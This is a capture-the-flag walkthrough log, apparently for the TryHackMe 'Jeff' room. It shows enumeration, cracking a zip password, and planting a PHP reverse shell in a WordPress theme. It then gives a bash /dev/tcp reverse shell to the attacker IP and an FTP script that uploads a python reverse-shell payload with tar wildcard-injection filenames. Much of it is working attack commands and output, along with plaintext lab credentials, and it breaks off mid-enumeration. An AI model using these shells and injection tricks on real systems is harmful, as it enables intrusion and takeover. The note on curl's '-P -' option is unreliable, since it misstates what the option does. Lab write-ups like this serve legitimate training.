----
Can you hack Jeff's web server?
----

![](https://tryhackme-images.s3.amazonaws.com/room-icons/f2d2f43d2fc1c4369f40370874e2df3e.png)

### Task 1  Get Root

 Start Machine

**This machine may take upto 5 minutes to fully deploy.**  

Get user.txt and root.txt.

This is my first ever box, I hope you enjoy it.  
If you find yourself brute forcing SSH, you're doing it wrong.

Please don't post spoilers or stream the box for at least a couple of days.

Answer the questions below

```
┌──(witty㉿kali)-[~/Downloads/CVE-2021-22204-exiftool]
└─$ rustscan -a 10.10.114.83 --ulimit 5500 -b 65535 -- -A -Pn
.----. .-. .-. .----..---.  .----. .---.   .--.  .-. .-.
| {}  }| { } |{ {__ {_   _}{ {__  /  ___} / {} \ |  `| |
| .-. \| {_} |.-._} } | |  .-._} }\     }/  /\  \| |\  |
`-' `-'`-----'`----'  `-'  `----'  `---' `-'  `-'`-' `-'
The Modern Day Port Scanner.
________________________________________
: https://discord.gg/GFrQsGy           :
: https://github.com/RustScan/RustScan :
 --------------------------------------
Real hackers hack time ⌛

[~] The config file is expected to be at "/home/witty/.rustscan.toml"
[~] Automatically increasing ulimit value to 5500.
[!] File limit is lower than default batch size. Consider upping with --ulimit. May cause harm to sensitive servers
Open 10.10.114.83:22
Open 10.10.114.83:80
[~] Starting Script(s)
[>] Script to be run Some("nmap -vvv -p {{port}} {{ip}}")

Host discovery disabled (-Pn). All addresses will be marked 'up' and scan times may be slower.
[~] Starting Nmap 7.93 ( https://nmap.org ) at 2023-07-14 13:31 EDT
NSE: Loaded 155 scripts for scanning.
NSE: Script Pre-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:31
Completed NSE at 13:31, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:31
Completed NSE at 13:31, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:31
Completed NSE at 13:31, 0.00s elapsed
Initiating Parallel DNS resolution of 1 host. at 13:31
Completed Parallel DNS resolution of 1 host. at 13:31, 0.01s elapsed
DNS resolution of 1 IPs took 0.04s. Mode: Async [#: 1, OK: 0, NX: 1, DR: 0, SF: 0, TR: 1, CN: 0]
Initiating Connect Scan at 13:31
Scanning 10.10.114.83 [2 ports]
Discovered open port 22/tcp on 10.10.114.83
Discovered open port 80/tcp on 10.10.114.83
Completed Connect Scan at 13:31, 0.19s elapsed (2 total ports)
Initiating Service scan at 13:31
Scanning 2 services on 10.10.114.83
Completed Service scan at 13:31, 6.73s elapsed (2 services on 1 host)
NSE: Script scanning 10.10.114.83.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:31
Completed NSE at 13:31, 6.26s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:31
Completed NSE at 13:31, 1.03s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:31
Completed NSE at 13:31, 0.00s elapsed
Nmap scan report for 10.10.114.83
Host is up, received user-set (0.19s latency).
Scanned at 2023-07-14 13:31:21 EDT for 14s

PORT   STATE SERVICE REASON  VERSION
22/tcp open  ssh     syn-ack OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 7e435f1e58a8fcc9f7fd4b400b837932 (RSA)
| ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQDg4z+/foDFEWvhoIYbCJR1YFXJSwUz3Tg4eFCje6gUXuRlCbi+AFLKT7Z7YeukAOdGfucg+sDdVG1Uay2MmT0YcWpPaWgJUmeHP3u3fYzwXgc2hwrHag+VTuuRM8zwwyR6gjRFIv1F9zTSPJBCkCWIHulcklArT8OMWLdKVCNK3B8ml92yUIA3HqnsN4DlGOTbYkpKd1G33zYNTXDDPwSi2N29rxWYdfRIJGjGfVT+EXFzccLtK+n+BJqsislTXv7h2Xi2aAJhw66RjBLoopu86ugdayaBb/Wfc1x1vQXAJAnAO02GPKueq/IzFUYGh/dlci7VG1qTz217chshXTqX
|   256 5c7992dde9d1465070f0346226f06939 (ECDSA)
| ecdsa-sha2-nistp256 AAAAE2VjZHNhLXNoYTItbmlzdHAyNTYAAAAIbmlzdHAyNTYAAABBBNCLV+aPDHn2ot0aIXSYrRbvARScbRpkGp+hjzAI2iInTc6jgb7GooapeEZOpacn4zFpsI/PR8wwA2QhYXi3aNE=
|   256 ced9822b695f82d0f55c9b3ebe7688c3 (ED25519)
|_ssh-ed25519 AAAAC3NzaC1lZDI1NTE5AAAAIBx35hakinwovxQnAWprmEBqZNVlj7JjrZO1WxDc/RF/
80/tcp open  http    syn-ack nginx
|_http-title: Site doesn't have a title (text/html).
| http-methods: 
|_  Supported Methods: GET HEAD
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

NSE: Script Post-scanning.
NSE: Starting runlevel 1 (of 3) scan.
Initiating NSE at 13:31
Completed NSE at 13:31, 0.00s elapsed
NSE: Starting runlevel 2 (of 3) scan.
Initiating NSE at 13:31
Completed NSE at 13:31, 0.00s elapsed
NSE: Starting runlevel 3 (of 3) scan.
Initiating NSE at 13:31
Completed NSE at 13:31, 0.00s elapsed
Read data files from: /usr/bin/../share/nmap
Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 16.72 seconds

┌──(witty㉿kali)-[~/Downloads/CVE-2021-22204-exiftool]
└─$ tac /etc/hosts
10.10.114.83 jeff.thm 

┌──(witty㉿kali)-[~/Downloads/CVE-2021-22204-exiftool]
└─$ gobuster -t 64 dir -e -k -u jeff.thm -w /usr/share/wordlists/dirb/common.txt
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://jeff.thm
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2023/07/14 13:41:41 Starting gobuster in directory enumeration mode
===============================================================
http://jeff.thm/admin                (Status: 301) [Size: 178] [--> http://jeff.thm/admin/]
http://jeff.thm/assets               (Status: 301) [Size: 178] [--> http://jeff.thm/assets/]
http://jeff.thm/backups              (Status: 301) [Size: 178] [--> http://jeff.thm/backups/]
http://jeff.thm/index.html           (Status: 200) [Size: 1178]
http://jeff.thm/uploads              (Status: 301) [Size: 178] [--> http://jeff.thm/uploads/]
Progress: 4490 / 4615 (97.29%)
===============================================================
2023/07/14 13:41:57 Finished
===============================================================


┌──(witty㉿kali)-[~/Downloads/CVE-2021-22204-exiftool]
└─$ gobuster -t 64 dir -e -k -u jeff.thm/backups -w /usr/share/wordlists/dirb/common.txt -x zip,bak
===============================================================
Gobuster v3.5
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://jeff.thm/backups
[+] Method:                  GET
[+] Threads:                 64
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.5
[+] Extensions:              zip,bak
[+] Expanded:                true
[+] Timeout:                 10s
===============================================================
2023/07/14 13:42:43 Starting gobuster in directory enumeration mode
===============================================================
http://jeff.thm/backups/backup.zip           (Status: 200) [Size: 62753]
http://jeff.thm/backups/index.html           (Status: 200) [Size: 9]
Progress: 13841 / 13845 (99.97%)
===============================================================
2023/07/14 13:43:32 Finished
===============================================================

┌──(witty㉿kali)-[~/Downloads]
└─$ unzip backup.zip 
Archive:  backup.zip
   creating: backup/
   creating: backup/assets/
[backup.zip] backup/assets/EnlighterJS.min.css password: 
   skipping: backup/assets/EnlighterJS.min.css  incorrect password
   skipping: backup/assets/EnlighterJS.min.js  incorrect password
   skipping: backup/assets/MooTools-Core-1.6.0-compressed.js  incorrect password
   skipping: backup/assets/profile.jpg  incorrect password
   skipping: backup/assets/style.css  incorrect password
   skipping: backup/index.html       incorrect password
   skipping: backup/wpadmin.bak      incorrect password

┌──(witty㉿kali)-[~/Downloads]
└─$ zip2john backup.zip > backup_hash
ver 1.0 backup.zip/backup/ is not encrypted, or stored with non-handled compression type
ver 1.0 backup.zip/backup/assets/ is not encrypted, or stored with non-handled compression type
ver 2.0 efh 5455 efh 7875 backup.zip/backup/assets/EnlighterJS.min.css PKZIP Encr: TS_chk, cmplen=6483, decmplen=34858, crc=541FD3B0 ts=7A80 cs=7a80 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/backup/assets/EnlighterJS.min.js PKZIP Encr: TS_chk, cmplen=14499, decmplen=49963, crc=545D786A ts=7A80 cs=7a80 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/backup/assets/MooTools-Core-1.6.0-compressed.js PKZIP Encr: TS_chk, cmplen=27902, decmplen=89614, crc=43D2FC37 ts=7A80 cs=7a80 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/backup/assets/profile.jpg PKZIP Encr: TS_chk, cmplen=10771, decmplen=11524, crc=F052E57A ts=7A80 cs=7a80 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/backup/assets/style.css PKZIP Encr: TS_chk, cmplen=675, decmplen=1439, crc=9BA0C7C1 ts=7A80 cs=7a80 type=8
ver 2.0 efh 5455 efh 7875 backup.zip/backup/index.html PKZIP Encr: TS_chk, cmplen=652, decmplen=1178, crc=39D2DBFF ts=7A80 cs=7a80 type=8
ver 1.0 efh 5455 efh 7875 ** 2b ** backup.zip/backup/wpadmin.bak PKZIP Encr: TS_chk, cmplen=53, decmplen=41, crc=FAECFEFB ts=7A80 cs=7a80 type=0
NOTE: It is assumed that all files in each archive have the same password.
If that is not the case, the hash may be uncrackable. To avoid this, use
option -o to pick a file at a time.
                                                                                       
┌──(witty㉿kali)-[~/Downloads]
└─$ john --wordlist=/usr/share/wordlists/rockyou.txt backup_hash 
Using default input encoding: UTF-8
Loaded 1 password hash (PKZIP [32/64])
Will run 4 OpenMP threads
Press 'q' or Ctrl-C to abort, almost any other key for status
!!Burningbird!!  (backup.zip)     
1g 0:00:00:04 DONE (2023-07-14 13:47) 0.2188g/s 3138Kp/s 3138Kc/s 3138KC/s "2parrow"..*7¡Vamos!
Use the "--show" option to display all of the cracked passwords reliably
Session completed. 

┌──(witty㉿kali)-[~/Downloads]
└─$ unzip backup.zip                                         
Archive:  backup.zip
[backup.zip] backup/assets/EnlighterJS.min.css password: 
  inflating: backup/assets/EnlighterJS.min.css  
  inflating: backup/assets/EnlighterJS.min.js  
  inflating: backup/assets/MooTools-Core-1.6.0-compressed.js  
  inflating: backup/assets/profile.jpg  
  inflating: backup/assets/style.css  
  inflating: backup/index.html       
 extracting: backup/wpadmin.bak      
                                                                                       
┌──(witty㉿kali)-[~/Downloads]
└─$ cd backup 
                                                                                       
┌──(witty㉿kali)-[~/Downloads/backup]
└─$ ls
assets  index.html  wpadmin.bak
                                                                                       
┌──(witty㉿kali)-[~/Downloads/backup]
└─$ cat wpadmin.bak 
wordpress password is: phO#g)C5dhIWZn3BKP

┌──(witty㉿kali)-[~/Downloads/backup]
└─$ wfuzz -u jeff.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.jeff.thm" --hc 404
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://jeff.thm/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload               
=====================================================================

000000001:   200        1 L      12 W       62 Ch       "www"                 
000000002:   200        1 L      12 W       62 Ch       "mail"                
000000006:   200        1 L      12 W       62 Ch       "smtp"                
000000010:   200        1 L      12 W       62 Ch       "whm"                 
 
^C /usr/lib/python3/dist-packages/wfuzz/wfuzz.py:80: UserWarning:Finishing pending requests...

Total time: 0
Processed Requests: 50
Filtered Requests: 0
Requests/sec.: 0

                                                                                       
┌──(witty㉿kali)-[~/Downloads/backup]
└─$ wfuzz -u jeff.thm -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H "Host: FUZZ.jeff.thm" --hc 404 --hw 12
 /usr/lib/python3/dist-packages/wfuzz/__init__.py:34: UserWarning:Pycurl is not compiled against Openssl. Wfuzz might not work correctly when fuzzing SSL sites. Check Wfuzz's documentation for more information.
********************************************************
* Wfuzz 3.1.0 - The Web Fuzzer                         *
********************************************************

Target: http://jeff.thm/
Total requests: 114441

=====================================================================
ID           Response   Lines    Word       Chars       Payload               
=====================================================================

000000326:   200        346 L    1455 W     25901 Ch    "wordpress"  


┌──(witty㉿kali)-[~/Downloads/backup]
└─$ tac /etc/hosts
10.10.114.83 jeff.thm wordpress.jeff.thm 

http://wordpress.jeff.thm/wp-login.php

┌──(witty㉿kali)-[~/Downloads]
└─$ wpscan --url http://wordpress.jeff.thm -e u
_______________________________________________________________
         __          _______   _____
         \ \        / /  __ \ / ____|
          \ \  /\  / /| |__) | (___   ___  __ _ _ __ ®
           \ \/  \/ / |  ___/ \___ \ / __|/ _` | '_ \
            \  /\  /  | |     ____) | (__| (_| | | | |
             \/  \/   |_|    |_____/ \___|\__,_|_| |_|

         WordPress Security Scanner by the WPScan Team
                         Version 3.8.22
                               
       @_WPScan_, @ethicalhack3r, @erwan_lr, @firefart
_______________________________________________________________

[i] Updating the Database ...
[i] Update completed.

[+] URL: http://wordpress.jeff.thm/ [10.10.114.83]
[+] Started: Fri Jul 14 13:58:30 2023

Interesting Finding(s):

[+] Headers
 | Interesting Entries:
 |  - Server: nginx
 |  - X-Powered-By: PHP/7.3.17
 | Found By: Headers (Passive Detection)
 | Confidence: 100%

[+] XML-RPC seems to be enabled: http://wordpress.jeff.thm/xmlrpc.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%
 | References:
 |  - http://codex.wordpress.org/XML-RPC_Pingback_API
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_ghost_scanner/
 |  - https://www.rapid7.com/db/modules/auxiliary/dos/http/wordpress_xmlrpc_dos/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_xmlrpc_login/
 |  - https://www.rapid7.com/db/modules/auxiliary/scanner/http/wordpress_pingback_access/

[+] WordPress readme found: http://wordpress.jeff.thm/readme.html
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 100%

[+] The external WP-Cron seems to be enabled: http://wordpress.jeff.thm/wp-cron.php
 | Found By: Direct Access (Aggressive Detection)
 | Confidence: 60%
 | References:
 |  - https://www.iplocation.net/defend-wordpress-from-ddos
 |  - https://github.com/wpscanteam/wpscan/issues/1299

[+] WordPress version 5.4.1 identified (Insecure, released on 2020-04-29).
 | Found By: Rss Generator (Passive Detection)
 |  - http://wordpress.jeff.thm/?feed=rss2, <generator>https://wordpress.org/?v=5.4.1</generator>
 |  - http://wordpress.jeff.thm/?feed=comments-rss2, <generator>https://wordpress.org/?v=5.4.1</generator>

[+] WordPress theme in use: twentytwenty
 | Location: http://wordpress.jeff.thm/wp-content/themes/twentytwenty/
 | Last Updated: 2023-03-29T00:00:00.000Z
 | Readme: http://wordpress.jeff.thm/wp-content/themes/twentytwenty/readme.txt
 | [!] The version is out of date, the latest version is 2.2
 | Style URL: http://wordpress.jeff.thm/wp-content/themes/twentytwenty/style.css?ver=1.2
 | Style Name: Twenty Twenty
 | Style URI: https://wordpress.org/themes/twentytwenty/
 | Description: Our default theme for 2020 is designed to take full advantage of the flexibility of the block editor...
 | Author: the WordPress team
 | Author URI: https://wordpress.org/
 |
 | Found By: Css Style In Homepage (Passive Detection)
 |
 | Version: 1.2 (80% confidence)
 | Found By: Style (Passive Detection)
 |  - http://wordpress.jeff.thm/wp-content/themes/twentytwenty/style.css?ver=1.2, Match: 'Version: 1.2'

[+] Enumerating Users (via Passive and Aggressive Methods)
 Brute Forcing Author IDs - Time: 00:00:01 <=========> (10 / 10) 100.00% Time: 00:00:01

[i] User(s) Identified:

[+] jeff
 | Found By: Author Posts - Display Name (Passive Detection)
 | Confirmed By:
 |  Rss Generator (Passive Detection)
 |  Author Id Brute Forcing - Author Pattern (Aggressive Detection)
 |  Login Error Messages (Aggressive Detection)

[!] No WPScan API Token given, as a result vulnerability data has not been output.
[!] You can get a free API token with 25 daily requests by registering at https://wpscan.com/register

[+] Finished: Fri Jul 14 13:58:56 2023
[+] Requests Done: 69
[+] Cached Requests: 6
[+] Data Sent: 16.26 KB
[+] Data Received: 20.43 MB
[+] Memory used: 168.273 MB
[+] Elapsed time: 00:00:25


jeff:phO#g)C5dhIWZn3BKP

http://wordpress.jeff.thm/wp-admin/theme-editor.php?file=404.php&theme=twentynineteen

revshell

┌──(witty㉿kali)-[~/Downloads]
└─$ tail payload_ivan.php
}
echo '<pre>';
// change the host address and/or port number as necessary
$sh = new Shell('10.8.19.103', 1337);
$sh->run();
unset($sh);
// garbage collector requires PHP v5.3.0 or greater
// @gc_collect_cycles();
echo '</pre>';
?>  

or exec("/bin/bash -c 'bash -i >& /dev/tcp/10.8.19.103/1337 0>&1'");

┌──(witty㉿kali)-[~/Downloads]
└─$ curl http://wordpress.jeff.thm/wp-content/themes/twentynineteen/404.php

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvp 1337
listening on [any] 1337 ...
connect to [10.8.19.103] from jeff.thm [10.10.114.83] 53050
SOCKET: Shell has connected! PID: 109
python3 -c "import pty; pty.spawn('/bin/bash')" || python -c "import pty; pty.spawn('/bin/bash')" || /usr/bin/script -qc /bin/bash /dev/null
sh: 1: python3: not found
sh: 1: python: not found
www-data@Jeff:/var/www/html/wp-content/themes/twentynineteen$ id
id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

www-data@Jeff:/var/www/html$ ls -lah /
ls -lah /
total 76K
drwxr-xr-x   1 root root 4.0K May 18  2020 .
drwxr-xr-x   1 root root 4.0K May 18  2020 ..
-rwxr-xr-x   1 root root    0 May 18  2020 .dockerenv
drwxr-xr-x   1 root root 4.0K Apr 23  2020 bin
drwxr-xr-x   2 root root 4.0K Feb  1  2020 boot
drwxr-xr-x   5 root root  340 Jul 14 17:29 dev
drwxr-xr-x   1 root root 4.0K May 18  2020 etc
drwxr-xr-x   2 root root 4.0K Feb  1  2020 home
drwxr-xr-x   1 root root 4.0K Apr 23  2020 lib
drwxr-xr-x   2 root root 4.0K Apr 22  2020 lib64
drwxr-xr-x   2 root root 4.0K Apr 22  2020 media
drwxr-xr-x   2 root root 4.0K Apr 22  2020 mnt
drwxr-xr-x   2 root root 4.0K Apr 22  2020 opt
dr-xr-xr-x 115 root root    0 Jul 14 17:29 proc
drwx------   1 root root 4.0K May 18  2020 root
drwxr-xr-x   1 root root 4.0K Apr 23  2020 run
drwxr-xr-x   1 root root 4.0K Apr 23  2020 sbin
drwxr-xr-x   2 root root 4.0K Apr 22  2020 srv
dr-xr-xr-x  13 root root    0 Jul 14 17:29 sys
drwxrwxrwt   1 root root 4.0K Jul 14 17:29 tmp
drwxr-xr-x   1 root root 4.0K Apr 22  2020 usr
drwxr-xr-x   1 root root 4.0K Apr 23  2020 var

www-data@Jeff:/var/www/html$ cat /etc/hosts
cat /etc/hosts
127.0.0.1	localhost
::1	localhost ip6-localhost ip6-loopback
fe00::0	ip6-localnet
ff00::0	ip6-mcastprefix
ff02::1	ip6-allnodes
ff02::2	ip6-allrouters
172.20.0.6	Jeff

www-data@Jeff:/var/www/html$ cat ftp_backup.php
cat ftp_backup.php
<?php
/* 
    Todo: I need to finish coding this database backup script.
	  also maybe convert it to a wordpress plugin in the future.
*/
$dbFile = 'db_backup/backup.sql';
$ftpFile = 'backup.sql';

$username = "backupmgr";
$password = "SuperS1ckP4ssw0rd123!";

$ftp = ftp_connect("172.20.0.1"); // todo, set up /etc/hosts for the container host

if( ! ftp_login($ftp, $username, $password) ){
    die("FTP Login failed.");
}

$msg = "Upload failed";
if (ftp_put($ftp, $remote_file, $file, FTP_ASCII)) {
    $msg = "$file was uploaded.\n";
}

echo $msg;
ftp_close($conn_id); 

www-data@Jeff:/tmp$ ls -la /usr/lib
ls -la /usr/lib
total 88
drwxr-xr-x  1 root root 4096 May 14  2020 .
drwxr-xr-x  1 root root 4096 Apr 22  2020 ..
drwxr-xr-x  1 root root 4096 Apr 23  2020 apache2
drwxr-xr-x  5 root root 4096 Apr 22  2020 apt
drwxr-xr-x  2 root root 4096 Apr 23  2020 bfd-plugins
drwxr-xr-x  2 root root 4096 Oct 15  2019 cgi-bin
drwxr-xr-x  2 root root 4096 Apr 23  2020 compat-ld
drwxr-xr-x  3 root root 4096 May 28  2019 dpkg
drwxr-xr-x  2 root root 4096 Apr 23  2020 file
drwxr-xr-x  1 root root 4096 Apr  6  2019 gcc
drwxr-xr-x  2 root root 4096 Apr 23  2020 gold-ld
drwxr-xr-x  3 root root 4096 May  1  2019 locale
drwxr-xr-x  1 root root 4096 Apr 23  2020 mime
-rw-r--r--  1 root root  261 Feb  1  2020 os-release
-rw-r--r--  1 root root   17 Jan 27  2019 pkg-config.multiarch
drwxr-xr-x  2 root root 4096 Jan 27  2019 pkgconfig
drwxr-xr-x  3 root root 4096 May 14  2020 python3
drwxr-xr-x 28 root root 4096 May 14  2020 python3.7
drwxr-xr-x  2 root root 4096 Dec 19  2019 sasl2
drwxr-xr-x  3 root root 4096 Apr 23  2020 ssl
drwxr-xr-x  1 root root 4096 May  6  2020 tmpfiles.d
drwxr-xr-x  1 root root 4096 May 14  2020 x86_64-linux-gnu

www-data@Jeff:/tmp$ python3
python3
bash: python3: command not found
www-data@Jeff:/tmp$ python3.7
python3.7
Python 3.7.3 (default, Dec 20 2019, 18:57:59) 
[GCC 8.3.0] on linux
Type "help", "copyright", "credits" or "license" for more information.
>>> exit()
exit()

┌──(witty㉿kali)-[~/Downloads]
└─$ cat ftp_jeff.py    
#!/usr/bin/python

from ftplib import FTP

ftp = FTP()
ftp.connect("172.20.0.1")
ftp.login("backupmgr", "SuperS1ckP4ssw0rd123!")
ftp.set_pasv(False)
ftp.retrlines("LIST",lambda line: print(line))
ftp.quit()

┌──(witty㉿kali)-[~/Downloads]
└─$ python3 -m http.server 1234
Serving HTTP on 0.0.0.0 port 1234 (http://0.0.0.0:1234/) ...
10.10.114.83 - - [14/Jul/2023 14:11:29] "GET /ftp_jeff.py HTTP/1.1" 200 -


www-data@Jeff:/tmp$ wget http://10.8.19.103:1234/ftp_jeff.py
wget http://10.8.19.103:1234/ftp_jeff.py
--2023-07-14 18:11:29--  http://10.8.19.103:1234/ftp_jeff.py
Connecting to 10.8.19.103:1234... connected.
HTTP request sent, awaiting response... 200 OK
Length: 207 [text/x-python]
Saving to: 'ftp_jeff.py'

ftp_jeff.py         100%[===================>]     207  --.-KB/s    in 0.002s  

2023-07-14 18:11:30 (122 KB/s) - 'ftp_jeff.py' saved [207/207]

www-data@Jeff:/tmp$ python3.7 ftp_jeff.py
python3.7 ftp_jeff.py
drwxr-xr-x    2 1001     1001         4096 May 18  2020 files

┌──(witty㉿kali)-[~/Downloads]
└─$ cat ftp_jeff.py 
#!/usr/bin/python

from ftplib import FTP

ftp = FTP()
ftp.connect("172.20.0.1")
ftp.login("backupmgr", "SuperS1ckP4ssw0rd123!")
ftp.set_pasv(False)
ftp.cwd('files')
ftp.retrlines("LIST",lambda line: print(line))
ftp.quit()

www-data@Jeff:/tmp$ python3.7 ftp_jeff.py
python3.7 ftp_jeff.py

www-data@Jeff:/tmp$ curl -s -v -P - 'ftp://backupmgr:SuperS1ckP4ssw0rd123!@172.20.0.1/'
<'ftp://backupmgr:SuperS1ckP4ssw0rd123!@172.20.0.1/'
* Expire in 0 ms for 6 (transfer 0x55ad40ae8f50)
*   Trying 172.20.0.1...
* TCP_NODELAY set
* Expire in 200 ms for 4 (transfer 0x55ad40ae8f50)
* Connected to 172.20.0.1 (172.20.0.1) port 21 (#0)
< 220 Welcome to Jeff's FTP service.
> USER backupmgr
< 331 Please specify the password.
> PASS SuperS1ckP4ssw0rd123!
< 230 Login successful.
> PWD
< 257 "/" is the current directory
* Entry path is '/'
> EPRT |1|172.20.0.6|49141|
< 200 EPRT command successful. Consider using EPSV.
* Connect data stream actively
* ftp_perform ends with SECONDARY: 1
> TYPE A
< 200 Switching to ASCII mode.
> LIST
< 150 Here comes the directory listing.
* Maxdownload = -1
* Preparing for accepting server on data port
* Checking for server connect
* Ready to accept data connection from server
* Connection accepted from server
drwxr-xr-x    2 1001     1001         4096 May 18  2020 files
* Remembering we are in dir ""
< 226 Directory send OK.
* Connection #0 to host 172.20.0.1 left intact

www-data@Jeff:/tmp$ curl -s -P - 'ftp://backupmgr:SuperS1ckP4ssw0rd123!@172.20.0.1/'
<'ftp://backupmgr:SuperS1ckP4ssw0rd123!@172.20.0.1/'
drwxr-xr-x    2 1001     1001         4096 May 18  2020 files

- `-P -`: It is used to specify the progress meter display format. In this case, the hyphen `-` indicates the default progress meter format. The progress meter provides visual feedback on the progress of the data transfer.

Overall, the command `curl -s -v -P -` performs a silent request while displaying verbose information and using the default progress meter format.

www-data@Jeff:/tmp$ curl -s -P - 'ftp://backupmgr:SuperS1ckP4ssw0rd123!@172.20.0.1/files'
<//backupmgr:SuperS1ckP4ssw0rd123!@172.20.0.1/files'

┌──(witty㉿kali)-[~/Downloads]
└─$ tesseract スクリーンショット-0003-01-17-11.14.27-1024x421.png output_3 -l eng txt && cat output_3.txt

┌──(witty㉿kali)-[~/Downloads]
└─$ cat ftp_jeff_final.py 
#!/usr/bin python3.7

from ftplib import FTP
import io
import os
import fileinput

#connecting to the host
ftp = FTP("172.20.0.1")

#login for ftp user

ftp.login("backupmgr", "SuperS1ckP4ssw0rd123!")
ftp.getwelcome()

ftp.set_pasv(False)
ftp.dir()
ftp.cwd("/files")

payload = io.BytesIO(b'python -c \'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.8.19.103",9999));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("/bin/bash")\'')
empty = io.BytesIO(b'')


ftp.storlines( 'STOR rev.sh', payload)
ftp.storlines( 'STOR --checkpoint=1', empty)
ftp.storlines( 'STOR --checkpoint-action=exec=sh rev.sh', empty)

ftp.quit()

www-data@Jeff:/tmp$ wget http://10.8.19.103:1234/ftp_jeff_final.py
wget http://10.8.19.103:1234/ftp_jeff_final.py
--2023-07-14 18:38:38--  http://10.8.19.103:1234/ftp_jeff_final.py
Connecting to 10.8.19.103:1234... connected.
HTTP request sent, awaiting response... 200 OK
Length: 707 [text/x-python]
Saving to: 'ftp_jeff_final.py'

ftp_jeff_final.py   100%[===================>]     707  --.-KB/s    in 0s      

2023-07-14 18:38:39 (5.18 MB/s) - 'ftp_jeff_final.py' saved [707/707]

www-data@Jeff:/tmp$ python3.7 ftp_jeff_final.py
python3.7 ftp_jeff_final.py
drwxr-xr-x    2 1001     1001         4096 May 18  2020 files

┌──(witty㉿kali)-[~/Downloads]
└─$ rlwrap nc -lvp 9999       
listening on [any] 9999 ...
connect to [10.8.19.103] from jeff.thm [10.10.114.83] 53982
backupmgr@tryharder:~/.ftp/files$ id
id
uid=1001(backupmgr) gid=1001(backupmgr) groups=1001(backupmgr)

backupmgr@tryharder:~/.ftp/files$ ip addr
ip addr
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 9001 qdisc fq_codel state UP group default qlen 1000
    link/ether 02:14:13:58:31:7d brd ff:ff:ff:ff:ff:ff
    inet 10.10.114.83/16 brd 10.10.255.255 scope global dynamic eth0
       valid_lft 2874sec preferred_lft 2874sec
    inet6 fe80::14:13ff:fe58:317d/64 scope link 
       valid_lft forever preferred_lft forever
3: docker0: <NO-CARRIER,BROADCAST,MULTICAST,UP> mtu 1500 qdisc noqueue state DOWN group default 
    link/ether 02:42:6e:70:d3:97 brd ff:ff:ff:ff:ff:ff
    inet 172.17.0.1/16 brd 172.17.255.255 scope global docker0
       valid_lft forever preferred_lft forever
4: br-9ab9d1baea74: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue state UP group default 
    link/ether 02:42:c8:33:0e:87 brd ff:ff:ff:ff:ff:ff
    inet 172.20.0.1/24 brd 172.20.0.255 scope global br-9ab9d1baea74
       valid_lft forever preferred_lft forever
    inet6 fe80::42:c8ff:fe33:e87/64 scope link 
       valid_lft forever preferred_lft forever
6: vetha5464fb@if5: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-9ab9d1baea74 state UP group default 
    link/ether de:6b:51:b1:0a:57 brd ff:ff:ff:ff:ff:ff link-netnsid 0
    inet6 fe80::dc6b:51ff:feb1:a57/64 scope link 
       valid_lft forever preferred_lft forever
8: veth2b69af5@if7: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc noqueue master br-9ab9d1baea74 state UP group default 
    link/ether 92:d5:2f:0e:aa:a6 brd ff:ff:ff:ff:ff:ff link-netnsid 1
    inet6 fe80::90d5:2fff:fe0e:aaa6/64 scope link 
       valid_lft forever preferred_lft forever

backupmgr@tryharder:~/.ftp/files$ ls
ls
'--checkpoint=1'  '--checkpoint-action=exec=sh rev.sh'   rev.sh
backupmgr@tryharder:/home$ cd backupmgr
cd backupmgr
backupmgr@tryharder:~$ ls
ls
backupmgr@tryharder:~$ ls -lah
